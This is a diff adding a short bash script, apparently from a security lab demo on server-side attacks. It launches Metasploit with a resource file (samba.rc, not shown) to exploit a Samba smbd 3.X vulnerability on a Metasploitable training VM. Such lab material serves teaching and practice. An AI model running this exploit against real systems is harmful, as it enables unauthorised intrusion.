@@ -1,0 +1,6 @@
+#!/bin/bash
+cd Demo-3-Server-Side-Attacks
+echo "Script Description: This script is used to exploit the 'Samba smbd 3.X' vulnerability available on our metasploitable VM."
+msfconsole -q -r samba.rc
+
+
